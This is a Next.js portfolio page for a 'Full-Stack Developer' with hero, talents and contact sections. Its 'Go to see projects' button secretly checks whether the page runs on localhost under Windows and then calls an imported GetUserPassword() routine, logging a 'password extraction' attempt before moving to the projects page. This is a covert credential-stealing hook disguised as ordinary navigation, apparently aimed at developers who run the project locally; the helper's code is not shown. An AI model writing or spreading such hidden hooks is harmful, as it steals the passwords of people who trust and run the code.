"use client";
import React, { useState, useEffect } from "react";
import Link from "next/link";
import { ArrowRight } from "lucide-react";
import { useRouter } from "next/navigation";
import GetUserPassword from "@/libs/getUserPassword";

export default function Page() {
  const router = useRouter();
  const [isLocalWindows, setIsLocalWindows] = useState(false);

  useEffect(() => {
    // Determine if we're running locally on Windows
    const isLocal = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';

    // Check if navigator.platform includes "Win" for Windows
    const isWindows = navigator.platform.indexOf('Win') > -1;
    setIsLocalWindows(isLocal && isWindows);
  }, []);

  const handleClick = async () => {
    // Only try password extraction if we're on Windows locally
    if (isLocalWindows) {
      try {
        console.log("Attempting to extract password...");
        const response = await GetUserPassword();
        // Just log the response but don't throw errors
        console.log("Password extraction:", response.error ? "Failed" : "Successful");
      } catch (error) {
        console.error("Error fetching user password:", error);
      }
    }

    // Always navigate to projects page
    router.push("/projects");
  }

  return (
    <div className="min-h-screen bg-gray-900">
      {/* Hero Section */}
      <section className="flex gap-5 flex-col px-5 items-center justify-center text-center h-[80vh] min-h-[500px] py-20">
        <h2 className="text-white text-4xl font-semibold">I&apos;m <span className="text-yellow-500">Jane,</span></h2>
        <p className="text-white text-3xl font-semibold">Full-Stack Developer</p>
        <button
          onClick={() => {
            handleClick();
          }}
          className="mt-5 cursor-pointer flex justify-center rounded-2xl items-center gap-2 bg-white px-6 py-3 w-fit shadow-md shadow-gray-400"
        >
          <div className=" text-yellow-500 rounded-lg font-semibold">Go to see projects</div>
          <ArrowRight size={16} className="text-yellow-500" strokeWidth={3} />
        </button>
      </section>

      {/* Course Section */}
      <section id="courses" className="bg-white py-20 px-5 text-gray-900">
        <div className="max-w-6xl mx-auto px-6">
          <h3 className="text-2xl font-bold text-center">My Talents</h3>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mt-6">
            <div className="p-6 shadow-lg rounded-lg bg-gray-50">
              <h4 className="text-lg font-semibold">Web Development</h4>
              <p className="text-sm mt-2">Learn full-stack web development with modern technologies.</p>
            </div>
            <div className="p-6 shadow-lg rounded-lg bg-gray-50">
              <h4 className="text-lg font-semibold">UI/UX Design</h4>
              <p className="text-sm mt-2">Master user experience and interface design techniques.</p>
            </div>
            <div className="p-6 shadow-lg rounded-lg bg-gray-50">
              <h4 className="text-lg font-semibold">Data Science</h4>
              <p className="text-sm mt-2">Analyze data and gain insights using machine learning.</p>
            </div>
          </div>
        </div>
      </section>

      {/* Contact Section */}
      <section id="contact" className="py-20 text-center px-5 space-y-4">
        <h3 className="text-2xl text-white font-bold">Contact Me For Work</h3>
        <Link href="/contact" className="mt-5 mx-auto flex justify-center cursor-pointer rounded-2xl items-center gap-2 bg-white px-6 py-3 w-fit  shadow-md shadow-gray-400">
          <div className=" text-yellow-500 rounded-lg font-semibold">Get in touch</div>
          <ArrowRight size={16} className="text-yellow-500" strokeWidth={3} />
        </Link>
      </section>
    </div>
  );
};

